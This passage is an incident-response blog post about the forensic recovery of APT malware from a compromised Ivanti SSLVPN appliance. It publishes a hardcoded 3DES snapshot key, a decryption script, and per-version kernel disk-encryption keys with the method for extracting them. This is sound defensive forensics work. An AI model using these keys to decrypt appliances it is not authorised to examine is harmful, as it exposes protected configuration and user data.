# APT malware reverse engineering and Incident Response on an Ivanti SSLVPN appliance 

An Advanced Persistent Threat (APT) planted unique malware in an Internet-exposed Ivanti SSLVPN appliance using a 0-day vulnerability. Less than 24 hours after notification, the hard drive disks were being unscrewed from their drawers and then plugged in a special read-only forensics device for a deep review.
 
![Forensics data acquisition setup](image1.jpeg)
_Forensics data acquisition setup_

During the forensics analysis, we found malware samples, which we reverse engineered.

![Overview of the identified “SPAWNCHIMERA” malware relationships](image2.png)

_Overview of the identified “SPAWNCHIMERA” malware relationships_

This blog post aims to:
* Cover how to perform Incident Response on a vendor-locked appliance
  * Depict limitations of vendor-approved diagnostic tools
  * Show how to parse the special system log file format from Ivanti devices
  * Explain how to break the encryption of Ivanti SSLVPN hard disk drives
  * Show once again that “timelining” a disk content is invaluable
* Share CGI reverse engineering findings on malware samples we obtained. 
  * Document the malware encryption technique
  * Publish extracted information such as the embedded SSH Server private key, the accepted attacker public key and the embedded certificates leaking the attack preparation time
  * Document the targeted binaries and server versions
  * Introduce a technique to pry embedded malware (SPAWNSNAIL-liblogblock.so from the dropper SPAWNMOLE-libdsupgrade.so)
 
# 1 - Performing Incident Response on a vendor-locked appliance

This incident started with a notification from intelligence partners, who presumably had scanned the public IP of the victim server and detected the malware implant.

We had three possible avenues to perform a direct review of this server and, by contrast, with indirect reviews based on firewall logs or other telemetry data.
* Ivanti provides an “Integrity Checker Tool”
* Ivanti also offers “System state snapshots”
* Incident Response teams have screwdrivers and hard drive readers
In this chapter, we’ll see the limits and benefits of each of these avenues.
 
![alt text](image3.png)

## 1.1 - Limitations of the vendor-approved tools

Appliance vendors are usually shy when it comes to running code on their appliances, as it might break their products, let alone would they provide administrators a real system-level shell. In the rare cases where getting a real shell is possible, that would be during a live session with the vendor technical analysts.

Ivanti provides an “Integrity Checker Tool” which reports whether the appliance is compromised. Existing documentation online shows that the SPAWN* malware family has a component to trick this “Integrity Checker Tool” into reporting it’s erroneously not infected. We also observed that behavior. The screenshot below shows how the “Integrity Checker Tool” claimed the entire system was safe. 

![alt text](image4.png)

_Integrity Checker Tool log entries reporting no compromise_

Ivanti also allows taking “snapshots” of a server state, which are a collection of system-level diagnostic commands outputs.
 
## 1.2 Decrypting Ivanti server snapshots

Ivanti server “snapshots” can be obtained from a live running appliance, and come in the form of an encrypted archive. We obtained an 8 MiB file named `pulsesecure-state-admin-localhost2-7-20250515-143147.encrypted`. Below is the process we used to extract the 85 MiB decrypted log file from it.

![alt text](image5.png)

_Diagram overview of the decryption process and involved files_

Fortunately, the security researcher known as “meekochii” [found a 3DES key](https://research.meekolab.com/comprehensive-ivanti-connect-secure-forensics-guide) in a screenshot of a vulnerability report from nccgroup, and was kind enough to share the following Python script allowing decryption of these encrypted snapshots.

```python
import sys
import struct
import argparse
from Crypto.Cipher import DES3
# Hardcoded DES3 key for decryption
HARDCODED_KEY = bytes.fromhex("7e95421a6b886641431b32c52442e2e483f81f58b0e9e9a5")

def decrypt(ciphertext, key, iv):
    """Decrypts ciphertext using Triple DES (DES3) with CFB mode."""
    cipher = DES3.new(key, DES3.MODE_CFB, iv, segment_size=64)
    return cipher.decrypt(ciphertext)

def parse_encrypted_config(filename):
    """Extracts the key, IV, and ciphertext from an encrypted snapshot file."""
    with open(filename, 'rb') as file:
        file.seek(1)  # Skip header or version byte
        iv = file.read(8)  # Read 8-byte IV
        file.seek(1, 1)  # Skip a byte indicating use of the hardcoded key
        size = struct.unpack('<i', file.read(4))[0]  # Get the size of encrypted data
        ciphertext = file.read(size)  # Read the ciphertext
    return HARDCODED_KEY, iv, ciphertext

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Decrypt Ivanti Connect Secure ICT.')
    parser.add_argument("action", help="Specify the 'decryption' action", choices=('decryption',))
    parser.add_argument("input", help="Path to the encrypted snapshot file")

    args = parser.parse_args()

    if args.action == "decryption":
        key, iv, ciphertext = parse_encrypted_config(args.input)
        decrypted_data = decrypt(ciphertext, key, iv)
        output_filename = 'snapshot.tar'
        with open(output_filename, 'wb') as output_file:
            output_file.write(decrypted_data)
        print('Decryption complete.')
```

Here is, for reference, what parsing this file format with Kaitai Struct at https://ide.kaitai.io/ looks like: the cryptographic Initialisation Vector (IV), a size field, followed by encrypted data.

![alt text](image6.png)

_Screenshot of ide.kaitai.io used to parse the header of an encrypted snapshot_

Using this script generates a “snapshot.tar” file which is a ZIP archive containing notably a very long ( 85 MiB ) text file 

```
$ file snapshot.tar 
snapshot.tar: Zip archive data, at least v2.0 to extract, compression method=deflate
$ unzip -l snapshot.tar
Archive:  snapshot.tar
  Length      Date    Time    Name
---------  ---------- -----   ----
 88405820  2025-05-15 16:34   pulsesecure-state-admin-localhost2-7-20250515-143147.decrypted
      456  2024-11-07 04:53   user_import_debuglog
      209  2024-11-07 04:51   system_import_debuglog
      901  2025-04-23 12:15   ipalloc_g_filteredIPPools_log_file
      331  2025-05-15 16:34   ipalloc_userrecord_log_file
---------                     -------
 88407717                     5 files
```


For reference, here is the exhaustive list of contents from this file. It includes the raw content of files, virtual /proc/ files, as well as command outputs (e.g. listing processes and open files).

```
$ grep '^###' pulsesecure-state-admin-localhost2-7-20250515-143147.decrypted | grep -v End | sed -e 's/\[.*//g'
### Contents of /proc/filesystems 
### Contents of /proc/devices 
### Contents of /proc/meminfo 
### Contents of /proc/slabinfo 
### Contents of /proc/swaps 
### Contents of /proc/mounts 
### Contents of /proc/loadavg 
### Contents of /proc/net/dev 
### Contents of /proc/net/route 
### Contents of /proc/locks 
### Contents of /proc/stat 
### Contents of /proc/interrupts 
### Contents of /proc/vmstat 
### Contents of /proc/sys/fs/file-nr 
### Contents of /proc/sys/fs/inode-nr 
### Contents of /proc/net/xfrm_stat 
### Contents of /proc/net/netfilter/nf_log 
### Contents of /proc/net/netfilter/nf_queue 
### Contents of /proc/net/netfilter/nfnetlink_queue 
### Contents of /proc/net/netlink 
### Contents of /proc/irq/34/smp_affinity 
### Contents of /proc/cgroups 
### Contents of /home/VERSION 
### Output of /home/bin/dsget /vc0/system/hwplatformstring 
### Output of tail -100 /home/runtime/snmp/log/snmpd.log 
### Output of /home/bin/dslog 
### Contents of /home/runtime/dlogs/debuglog.old 
### Contents of /home/runtime/dlogs/debuglog 
### Contents of /home/runtime/dlogs/registration.log 
### Contents of /home/runtime/dlogs/configure_network.log 
### Contents of /home/runtime/dlogs/conntrack.logs 
### Contents of /home/runtime/dlogs/conntrack.logs.1 
### Contents of /home/runtime/dlogs/cav_webserv.log.old 
### Contents of /home/runtime/dlogs/cav_webserv.log 
### Contents of /home/runtime/pgsql/postgresd.log.old 
### Contents of /home/runtime/pgsql/postgresd.log 
### Contents of /home/runtime/dlogs/oauth_oidc.log.old 
### Contents of /home/runtime/dlogs/oauth_oidc.log 
### Contents of /home/runtime/dlogs/fluent-bit.log.old 
### Contents of /home/runtime/dlogs/fluent-bit.log 
### Contents of /home/runtime/fluent-bit/fb_base.conf 
### Contents of /home/runtime/fluent-bit/fb_filters.conf 
### Contents of /home/runtime/fluent-bit/fb_in_syslog.conf 
### Contents of /home/runtime/fluent-bit/fb_in_tcp.conf 
### Contents of /home/runtime/fluent-bit/fb_out_httpclient.conf 
### Contents of /home/runtime/fluent-bit/fb_out_kafkarest.conf 
### Contents of /home/runtime/fluent-bit/fb_parsers.conf 
### Contents of /home/runtime/fluent-bit/fluent-bit.conf 
### Output of /home/bin/curl http://127.0.0.1:5190/api/v1/metrics 
### Output of /home/bin/dsshowstatementcounters 
### Contents of /home/runtime/dlogs/nodemonlog.old 
### Contents of /home/runtime/dlogs/nodemonlog 
### Contents of /home/runtime/dlogs/spreadlog.old 
### Contents of /home/runtime/dlogs/spreadlog 
### Contents of /home/runtime/dlogs/spread.out.old 
### Contents of /home/runtime/dlogs/spread.out 
### Contents of /home/runtime/dlogs/spmonlog.old 
### Contents of /home/runtime/dlogs/spmonlog 
### Contents of /home/runtime/kwatchdog/heartbeats 
### Contents of /home/runtime/kwatchdog/kwatchdoglog.old 
### Contents of /home/runtime/kwatchdog/kwatchdoglog 
### Contents of /home/runtime/kwatchdog/watchdog.conf 
### Contents of /tmp/iptables-stderr 
### Contents of /tmp/iptables-stdout 
### Contents of /home/ace/data/log 
### Contents of /tmp/raid-mgr-logs 
### Contents of /home/runtime/ntp/ntpd.log 
### Contents of /home/runtime/ntp/ntpd.log.old 
### Output of /bin/ntpq -p 
### Output of /bin/ls -l /etc/ntp.conf /data/runtime/ntp/ive_ntp.conf 
### Contents of /home/runtime/ntp/ive_ntp.conf 
### Contents of /home/runtime/cluster/spread/spread-conf 
### Contents of /home/runtime/cluster/info 
### Contents of /home/runtime/cluster/hosts 
### Contents of /home/runtime/mtmp/event/eventSubscriptions 
### Contents of /home/runtime/mtmp/event/pendingEvents 
### Contents of /tmp/cgi-errors 
### Output of /home/bin/dslicenseinfo 
### Output of /home/bin/dslicserverinfo -summary 
### Output of /home/bin/dslicserverinfo -clients 
### Output of /home/bin/dslicclientinfo -listserver 
### Output of /home/bin/dslicclientinfo -listcapacity 
### Output of /home/bin/dstaillog -n 100 -t events 
### Output of /home/bin/dstaillog -n 100 -t access 
### Output of /home/bin/dstaillog -n 100 -t admin 
### Output of /home/bin/dshostname 
### Output of /bin/netstat --statistics 
### Output of /usr/sbin/ss --summary 
### Output of /usr/sbin/ss --tcp --all --numeric --options --memory --info 
### Output of /usr/sbin/ss --udp --all --numeric 
### Output of /bin/netstat --unix --all --numeric 
### Output of /usr/sbin/ss --packet --all --numeric 
### Output of /usr/sbin/ss --raw --all --numeric 
### Output of /bin/ps n --columns=260 -eo user,pid,ppid,pcpu,pmem,vsz,rss,tty,stat,start,time,wchan,cgroup,command 
### Output of /usr/sbin/lsof -n 
### Output of /home/bin/dsclinfo 
### Output of /home/bin/dsclrtts 
### Output of /home/bin/dsstatdump 
### Output of /home/bin/dsstatdump -o 
### Output of /home/bin/dsdumpkwatchdogstatus 
### Output of /home/bin/dsnetinfo 
### Output of /usr/bin/mpstat -P ALL 
### Output of /usr/bin/mpstat -P ALL -I SUM 
### Output of /home/bin/dssyncqls -v 
### Output of /home/bin/dssyncqstats 
### Contents of /home/runtime/dlogs/licenseTrace.old 
### Contents of /home/runtime/dlogs/licenseTrace 
### Output of /sbin/iptables -L -v -n 
### Output of /sbin/ip6tables -L -v -n 
### Output of /sbin/ipset list 
### Output of /sbin/iptables -t mangle -L -v -n 
### Output of /sbin/ip6tables -t mangle -L -v -n 
### Output of /usr/sbin/ip addr 
### Output of /usr/sbin/ip -s link 
### Output of /sbin/route -n 
### Output of /sbin/arp -n 
### Contents of /home/runtime/ip.cfg 
### Output of /usr/sbin/ip route list table all 
### Output of /usr/sbin/ip rule list 
### Output of /usr/sbin/ip -6 route list table all 
### Output of /usr/sbin/ip -6 rule list 
### Output of cat /proc/net/vlan/config 
### Output of cat /proc/net/vlan/* 
### Contents of /etc/iproute2/rt_tables 
### Contents of /usr/sbin/ip neigh show 
### Contents of /usr/sbin/ip -6 neigh show 
### Output of /bin/df -k 
### Output of /bin/ls -laR /home /home/runtime/ /home/ace/ /data/var/ /var/tmp/ 
### Output of /home/bin/listLargeFiles.sh 
### Output of /bin/grep -c tun /proc/net/dev 
### Output of /usr/sbin/setkey -D 
### Output of /usr/sbin/setkey -DPp 
### Output of cat /proc/net/xfrm_stat 
### Output of cat /proc/net/snmp 
### Output of /usr/sbin/tc -s qdisc 
### Output of /usr/sbin/tc -s class show dev int0 
### Output of /usr/sbin/tc -s class show dev ext0 
### Output of /usr/sbin/tc -s filter show dev int0 
### Output of /usr/sbin/tc -s filter show dev ext0 
### Output of /usr/sbin/lshw -businfo -numeric -quiet 
### Output of cat /proc/mdstat 
### Output of /sbin/mdadm --verbose --detail --scan 
### Output of cat /etc/mdadm.conf 
### Output of cat /tmp/raid-mgr-status 
### Output of cat /tmp/sdoutput 
### Output of /home/bin/collect-system-stats.sh io-stats 
### Output of cat /tmp/stats/event-proc-stats-all 
### Output of cat /tmp/stats/dspar-stats-all 
### Output of /home/bin/dscacheinfo 
### Output of /home/bin/dslmdbstat 
### Contents of /tmp/cache_check.log 
### Output of /home/bin/dslsmc -t 5 -n 2 
### Output of /usr/bin/sdt.x86 
### Output of /home/bin/dsls -s /  -R /  
### Output of /home/bin/dsnamedusersinfo 
### Contents of /tmp/back_trace_dump 
### Output of /home/venv3/bin/python3 /home/venv3/lib/python3.6/site-packages/adapter-0.1-py3.6.egg/adapter/config_utils/dump_config.py
```


Using this decrypted file we quickly spotted libdsupgrade.so being mentioned as loaded library by pretty much every process on the server.

![alt text](image7.png)

_Fig.2. Result of “grep libdsupgrade” on the decrypted file._


Unfortunately, the only filesystem file listing from that snapshot is as follows:

```
### Output of /bin/ls -laR /home /home/runtime/ /home/ace/ /data/var/ /var/tmp/
```
And it does not contain /lib/, preventing us from getting any information on that /lib/libdsupgrade.so file mentioned by Mandiant as being malicious. As such, we elected to grab the data straight from the disks.

## 1.3 Getting the physical hard drives

This part involves sending someone in the datacentre floor with clear instructions, and asking for pictures of the hard drive packaged box before shipping them to the IR team. We strongly recommend asking for pictures, because one might receive the following picture, and no-one wants to send entire servers through postal mail 😊
 
![alt text](image8.jpeg)

_Information loss between the numerous parties involved caused the entire server to be packaged for mail, while we just needed two standard 3.5-inch SATA hard drives._


Fast forward a few days, we finally have our two 1TB disks imaged in two 97GiB EWF EnCase container formats, thanks to a Tableau Forensic SATA write blocker device.
 
![alt text](image1-1.jpeg)

_Forensics data acquisition setup_

Below is an overview of the disk structure and mounting operations. The following sections will describe each of the mounting operations one by one, and is pretty technical, so you might want to keep that map handy in another window while you read through.
 
![alt text](image9.png)

_Disk structure and mounting operations_

## 1.4 Mounting the EWF images with ewfmount
Let’s first list the two generated files with “ls”, and detect their nature using the “file” UNIX tool.

```shell
# ls -sS1h *E01
97G IvantiHDD1.E01
97G IvantiHDD2.E01
# file *E01
IvantiHDD1.E01: EWF/Expert Witness/EnCase image file format
IvantiHDD2.E01: EWF/Expert Witness/EnCase image file format
```


The [ewf](https://forensics.wiki/libewf/) format is a container format providing some integrity capabilities, appropriate for forensics evidence. Using ewfmount it’s possible to expose via FUSE the contents of these EWF archives : two 932 GiB disk images, likely full of zeroes allowing their compressed container to be as small as 97 GiB. The EWF archives being mounted by Linux as “fuse” folders is visible in the “mount” command output, as depicted below.

```shell
# ewfmount IvantiHDD2.E01 mnt2
# ewfmount IvantiHDD1.E01 mnt
# find mnt/ mnt2/ -type f -printf "%s %p\n"
1000204886016 mnt/ewf1
1000204886016 mnt2/ewf1
# python3 -c 'print(1000204886016 / (1024**3))'
931.5133895874023
# mount|grep /dev/fuse
/dev/fuse on /path/mnt type fuse (rw,nosuid,nodev,relatime,user_id=0,group_id=0)
/dev/fuse on /path/mnt2 type fuse (rw,nosuid,nodev,relatime,user_id=0,group_id=0)
```

## 1.5 Accessing mountable partitions with losetup

Having these disks readable allows reviewing them for embedded partitions with the “fdisk” tool, after the “file” tool recognised a bootable disk image, using the LILO bootloader.

```shell
# file mnt/ewf1 
mnt/ewf1: DOS/MBR boot sector, LInux i386 boot LOader; partition 1 : ID=0xfd, start-CHS (0x0,0,2), end-CHS (0x4,254,63), startsector 1, 80324 sectors; partition 2 : ID=0xfd, start-CHS (0x5,0,1), end-CHS (0x9,254,63), startsector 80325, 80325 sectors; partition 3 : ID=0xfd, start-CHS (0xa,0,1), end-CHS (0xe,254,63), startsector 160650, 80325 sectors; partition 4 : ID=0x85, start-CHS (0xf,0,1), end-CHS (0x3ff,254,63), startsector 240975, 1953279090 sectors
# fdisk -l mnt/ewf1 
Disk mnt/ewf1: 931.5 GiB, 1000204886016 bytes, 1953525168 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x15af87e4

Device      Boot     Start        End    Sectors   Size Id Type
mnt/ewf1p1               1      80324      80324  39.2M fd Linux raid autodetect
mnt/ewf1p2           80325     160649      80325  39.2M fd Linux raid autodetect
mnt/ewf1p3          160650     240974      80325  39.2M fd Linux raid autodetect
mnt/ewf1p4          240975 1953520064 1953279090 931.4G 85 Linux extended
mnt/ewf1p5          240976   12530699   12289724   5.9G fd Linux raid autodetect
mnt/ewf1p6        12530701   22780169   10249469   4.9G fd Linux raid autodetect
mnt/ewf1p7        22780171   94462199   71682029  34.2G fd Linux raid autodetect
mnt/ewf1p8        94462201  104711669   10249469   4.9G fd Linux raid autodetect
mnt/ewf1p9       104711671  176393699   71682029  34.2G fd Linux raid autodetect
mnt/ewf1p10      176393701  184586849    8193149   3.9G fd Linux raid autodetect
mnt/ewf1p11      184586851  258325199   73738349  35.2G fd Linux raid autodetect
mnt/ewf1p12      258325201  278808074   20482874   9.8G fd Linux raid autodetect
mnt/ewf1p13      278808076  299290949   20482874   9.8G fd Linux raid autodetect
mnt/ewf1p14      299290951  299371274      80324  39.2M 83 Linux
```

This disk contains 14 partitions of a RAID array. RAID is a redundancy protocol, and in fact our two disks had exactly the same contents, mirroring the same RAID underlying devices. It’s possible to have these partitions mountable straight in Linux by mapping the two disks as loop devices with `losetup`.

```shell
# losetup -Pvfr --show mnt/ewf1
/dev/loop0
# losetup -Pvfr --show mnt2/ewf1
/dev/loop1
```

If everything goes fine and your Linux kernel knows how to handle RAID arrays, the filesystem autodetection might automatically create `/dev/md/md<number>` virtual device entries ready to be mounted, as depicted by the `lsblk` command output below:

```
# lsblk                              
NAME       MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT
loop0        7:0    0 931.5G  1 loop 
├─loop0p1  259:0    0  39.2M  1 loop
│ └─md117    9:117  0  39.1M  1 raid1 /tmp/mnt-117
├─loop0p2  259:1    0  39.2M  1 loop
│ └─md119    9:119  0  39.1M  1 raid1 /tmp/mnt-119
├─loop0p3  259:2    0  39.2M  1 loop
│ └─md123    9:123  0  39.1M  1 raid1 /tmp/mnt-123
├─loop0p4  259:3    0     1K  1 loop
├─loop0p5  259:4    0   5.9G  1 loop 
│ └─md121    9:121  0   5.9G  1 raid1
├─loop0p6  259:5    0   4.9G  1 loop 
│ └─md122    9:122  0   4.9G  1 raid1
├─loop0p7  259:6    0  34.2G  1 loop   
│ └─md125    9:125  0  34.2G  1 raid1
├─loop0p8  259:7    0   4.9G  1 loop           
│ └─md127    9:127  0   4.9G  1 raid1
├─loop0p9  259:8    0  34.2G  1 loop               
│ └─md124    9:124  0  34.2G  1 raid1          
├─loop0p10 259:9    0   3.9G  1 loop           
│ └─md120    9:120  0   3.9G  1 raid1
├─loop0p11 259:10   0  35.2G  1 loop
│ └─md118    9:118  0  35.2G  1 raid1
├─loop0p12 259:11   0   9.8G  1 loop
│ └─md126    9:126  0   9.8G  1 raid1
├─loop0p13 259:12   0   9.8G  1 loop
│ └─md116    9:116  0   9.8G  1 raid1
└─loop0p14 259:13   0  39.2M  1 loop
# find /dev/md/ -type l -printf "%p -> %l\n" | sort -V | column -t
/dev/md/1_0   ->  ../md117
/dev/md/2_0   ->  ../md119
/dev/md/3_0   ->  ../md123
/dev/md/5_0   ->  ../md121
/dev/md/6_0   ->  ../md122
/dev/md/7_0   ->  ../md125
/dev/md/8_0   ->  ../md127
/dev/md/9_0   ->  ../md124
/dev/md/10_0  ->  ../md120
/dev/md/11_0  ->  ../md118
/dev/md/12_0  ->  ../md126
/dev/md/13_0  ->  ../md116
```

We can now probe these partitions for content, trying to find what is supposed to be a bootable disk, and what is encrypted.

```shell
# for i in /dev/md1* ; do echo -n "${i} : " ; dd if="${i}" bs=4096 count=1 status=none | file - ; done
/dev/md116 : /dev/stdin: data
/dev/md117 : /dev/stdin: Linux rev 1.0 ext2 filesystem data (mounted or unclean), UUID=9384dd7d-98a2-4499-9ac9-759721d98f9c
/dev/md118 : /dev/stdin: POSIX tar archive (GNU)
/dev/md119 : /dev/stdin: DOS/MBR boot sector, LInux i386 boot LOader
/dev/md120 : /dev/stdin: Linux/i386 swap file (new style), version 1 (4K pages), size 1024111 pages, no label, UUID=f105f405-a49e-4c8e-b952-cb8dcf80f6fd
/dev/md121 : /dev/stdin: data
/dev/md122 : /dev/stdin: data
/dev/md123 : /dev/stdin: DOS/MBR boot sector, LInux i386 boot LOader
/dev/md124 : /dev/stdin: data
/dev/md125 : /dev/stdin: data
/dev/md126 : /dev/stdin: data
/dev/md127 : /dev/stdin: data
```


We’ll spare you the analysis part, here are the results: 3 different appliance versions ( R1844, R18.6, R18.9 ) each had :
* A cleartext /boot/ bootable partition with a Linux kernel
* *3 encrypted data partition ( Named “initrd”, “data”, “logs + tmp”  )

| partition | RAID  | RAID MiB | RAID GiB | purpose      | version | decrypted | filesystem |
| ---       | ---   | ---      | ---      | ---          | ---     | ---       | ---        |
| p1        | md117 | 39.13    | 0.04     | boot         | R1844   | cleartext | ext2 grub  |
| p10       | md120 | 4000.44  | 3.91     | initrd       | R1844?  | no        |            |
| p11       | md118 | 36004.94 | 35.16    | data         | R1844?  | no        |            |
| p12       | md126 | 10001.31 | 9.77     | logs tmp     | R18.6   | yes       | ext3       |
| p13       | md116 | 10001.31 | 9.77     | logs tmp     | R18.9   | yes       | ext3       |
| p14       | #N/A  | #N/A     | #N/A     | recovery?    |         |           |            |
| p2        | md119 | 39.13    | 0.04     | boot         | R18.6   | cleartext | ext2 LILO  |
| p3        | md123 | 39.13    | 0.04     | boot         | R18.9   | cleartext | ext2 LILO  |
| p4        | #N/A  | #N/A     | #N/A     | raid wrapper |         |           |            |
| p5        | md121 | 6000.75  | 5.86     | logs tmp     | R1844?  | no        |            |
| p6        | md122 | 5004.50  | 4.89     | initrd       | R18.6   | yes       | ext2       |
| p7        | md125 | 35000.88 | 34.18    | data         | R18.6   | yes       | ext3       |
| p8        | md127 | 5004.50  | 4.89     | initrd       | R18.9   | yes       | ext2       |
| p9        | md124 | 35000.88 | 34.18    | data         | R18.9   | yes       | ext3       |

_Partition table of the RAID devices_

As documented by NorthWave Cybersecurity [here](https://northwave-cybersecurity.com/resources/insights/how-to-conduct-forensic-investigation-ivanti-devices) and [here](https://northwave-cybersecurity.com/whitepapers-articles/investigating-a-possible-ivanti-compromise), Ivanti devices use a custom encryption scheme for their disk partitions, and hardcoded cryptographic keys depending on the exact Linux versions. They were kind enough to [publish a decryption tool](https://github.com/NorthwaveSecurity/lilo-pulse-secure-decrypt), along with [keys](https://github.com/NorthwaveSecurity/lilo-pulse-secure-decrypt/blob/main/keys.c) for some versions of the Linux kernel, and some documentation on how to locate a new key.

## 1.6 Extracting the cryptographic keys out of the Linux kernel image
The bootable cleartext partitions look like the following, and just contain version information along with a bootable Linux kernel image.

```shell
# ls
VERSION  boot.b  boot.message  kernel  lilo.1  lost+found  map
# ls -l
total 4206
-rwxr-xr-x 1  675  511     198 May  2  2024 VERSION
-rwxr-xr-x 1  675  511     512 May  2  2024 boot.b
-rw-r--r-- 1 root root     102 Nov  7  2024 boot.message
-rwxr-xr-x 1 root root 4173808 Jun 24  2024 kernel
-rw-r--r-- 1 root root     442 Jun 24  2024 lilo.1
drwx------ 2 root root   12288 Jun 24  2024 lost+found
-rw------- 1 root root   98304 Nov  7  2024 map
# cat VERSION 
export DSREL_MAJOR=9
export DSREL_MINOR=1
export DSREL_MAINT=18
export DSREL_DATAVER=5101
export DSREL_PRODUCT=ssl-vpn
export DSREL_DEPS=ive
export DSREL_BUILDNUM=25505
export DSREL_COMMENT="R18.6"
# file kernel
kernel: Linux kernel x86 boot executable bzImage, version 2.6.32-00229-gf8e091e-dirty (slt_ec_builder@lxc-linux64-0006-scl6_4_R3_1_9-pulse6_4R3_1_9) #1 S, RO-rootFS, swap_dev 0x3, Normal VGA
```

The kernel image is a compressed Linux image which has to be decompressed using the [extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) script available on Linus Torvalds GitHub repository. 

```shell
# ./extract-vmlinux /tmp/mnt5/kernel > R18.6_2.6.32-00229-gf8e091e-dirty.vmlinux
# file R18.6_2.6.32-00229-gf8e091e-dirty.vmlinux
R18.6_2.6.32-00229-gf8e091e-dirty.vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=c6e81923db33e78d111501de90371c2c9650b0ca, stripped
```

And this is now a 15MiB Linux executable image with hardcoded cryptographic keys. Locating the keys is a complex problem, which NorthWave security solved by booting and debugging Linux in a virtual machine. They also found a [CISA report](https://www.cisa.gov/sites/default/files/2025-03/MAR-25993211.r1.v1.CLEAR_.pdf) where a persistence script from the threat actor is documented. That persistence script pulls the keys from the kernel by searching for the string “Linux version”, skipping 0x190 bytes and grabbing the next 16 bytes as a key.

This is where one need to locate the cryptographic key. As it turns out, just searching for “Linux version” in a tool like [Malcat](https://malcat.fr) and looking for contiguous data yields 16 bytes which could be a key, and they even have code references!

![alt text](image11.png)
 
If we pivot to that assembly code reference, we’re greeted by two 8-bytes loads fetching the data we were looking at, followed by a XOR operation XOR-ing the data with 4 4-bytes constants. (Note: these constants were also hardcoded in “dsmain” our SPAWNSNARE malware sample, as we will see in the dedicated reverse engineering section)

![alt text](image12.png)

The same data browsed with IDA Pro shows our two large constants being stored just after the “Linux version” string,  and mentioned from the same function.

![alt text](image13.png)

Pivot to the function by double-clicking it, press F5 to use the Hex-Rays decompiler from IDA Pro and voilà, here are your cryptographic keys, automatically xored:

![alt text](image14.png)

These keys can be added to `keys.c` from the NorthWave decryption tool. Here are the two keys we managed to extract. The key in the screenshot above is the first one, the byte order is reversed in the C code due to little-endianness.

```C
{ .kernel_version = "2.6.32-00049-gb2a3a5b-dirty", .key = {0xd4, 0x73, 0x74, 0xec, 0x2d, 0x74, 0xb4, 0x83, 0x1b, 0xea, 0xa9, 0x9e, 0x4d, 0x93, 0xda, 0xa9} }, /* R18.9 */
{ .kernel_version = "2.6.32-00229-gf8e091e-dirty", .key = {0x45, 0x27, 0x08, 0x40, 0x5b, 0x39, 0x4f, 0x62, 0xff, 0x72, 0x4e, 0x11, 0xd8, 0x96, 0xdb, 0x96} }, /* R18.6 */
```
## 1.7 Decrypting the encrypted partitions

Having these keys available, we could then try to decrypt the RAID partitions and see if the `file` UNIX tool recognises a partition. Answer: yes, 3 partitions could be decrypted with this key.

![alt text](image15.png)
 
We could then use the “dsdecrypt” tool to entirely decrypt these partitions.

```shell
# file *raw
md116.raw: Linux rev 1.0 ext3 filesystem data, UUID=8f08a3ba-c1b3-4aa0-adc7-5735a5f2c3e0 (needs journal recovery) (large files)
md124.raw: Linux rev 1.0 ext3 filesystem data, UUID=f93213a8-f8b0-418d-876d-02ce16d6d1ed (needs journal recovery) (large files)
md127.raw: Linux rev 1.0 ext2 filesystem data, UUID=2fd398e4-9fbf-4ee4-9ad6-009803d5e463 (large files)
# ls -1sSh *raw
6.9G md124.raw
526M md116.raw
4.9G md127.raw
```

Finally, we exposed them as loop devices with “losetup” and mounted them with “mount” in temporary folders. And finally, we obtained `/lib/libdsupgrade.so` 😊

![alt text](image16.png)

_File listing of the decrypted partitions content_

And here is the identification of our malicious file, the SPAWNMOLE malware sample:

```shell
# file /tmp/mnt2/lib/libdsupgrade.so 
/tmp/mnt2/lib/libdsupgrade.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.16, stripped
# sha256sum /tmp/mnt2/lib/libdsupgrade.so 
dd091b5a8783eb2cebafe5327d8d7d60ef903e6d062cca1c0549157033072f40  /tmp/mnt2/lib/libdsupgrade.so
```

## 1.8 Parsing the Ivanti custom logs
Now that we had access to real data, we wanted to check system logs. Unfortunately, on this Ivanti CentOS 6.4 Linux version all logs have been disabled except for the handful of logs found in `/runtime/logs/` :

```shell
# ls /tmp/mnt4/runtime/logs/ -1sSh
total 4.7M
2.3M log.access.vc0
2.2M log.admin.vc0
228K log.events.vc0
 12K log.access.vc0.old
 12K log.events.vc0.old
8.0K log.diagnosticlog.vc0
8.0K log.policytrace.vc0
8.0K log.sensorslog.vc0
   0 lck.log.access.vc0
   0 lck.log.admin.vc0
   0 lck.log.diagnosticlog.vc0
   0 lck.log.events.vc0
   0 lck.log.policytrace.vc0
   0 lck.log.sensorslog.vc0
```

These logs are all prefixed with 8KiB ( 0x2000 ) null bytes. Then, their format is mostly line based, with the beginning of the line being the epoch timestamp in hexadecimal form.

```shell
# hd -n 8240 /tmp/mnt4/runtime/logs/log.admin.vc0
00000000  05 00 00 00 01 00 00 00  00 00 00 00 00 00 00 00  |................|
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00002000  37 01 36 37 65 33 39 39  31 31 2e 30 34 38 64 39  |7.67e39911.048d9|
00002010  35 09 6c 6f 63 61 6c 68  6f 73 74 32 09 41 44 4d  |5.localhost2.ADM|
00002020  32 30 35 39 39 09 76 63  30 09 52 6f 6f 74 09 31  |20599.vc0.Root.1|
00002030
```

Here, `67e39911` stands for `2025-03-26T06:05:05`. Such logs can be decoded with the following Python one-liner :

```python
# strings log.admin.vc0 | python3 -c 'import sys,datetime;print("\n".join(map(lambda x:"\t".join([datetime.datetime.fromtimestamp(int(x[:8],16)).strftime("%Y-%m-%dT%H:%M:%S"),x]),filter(lambda x:x.startswith("6"),sys.stdin.readlines()))))'|sort -u|less
import sys,datetime;print("\n".join(map(lambda x:"\t".join([datetime.datetime.fromtimestamp(int(x[:8],16)).strftime("%Y-%m-%dT%H:%M:%S"),x]),filter(lambda x:x.startswith("6"),sys.stdin.readlines()))))
```

Reading the content of these logs didn’t prove really useful, as they only covered a few days worth of events.

## 1.9 Timelining proves useful once again

We collected all timestamps from files in these three decrypted partitions using the command below. This collected files:
* Last Access Time
* Last Status Change Time
* Last Modification Time
* Path

```shell
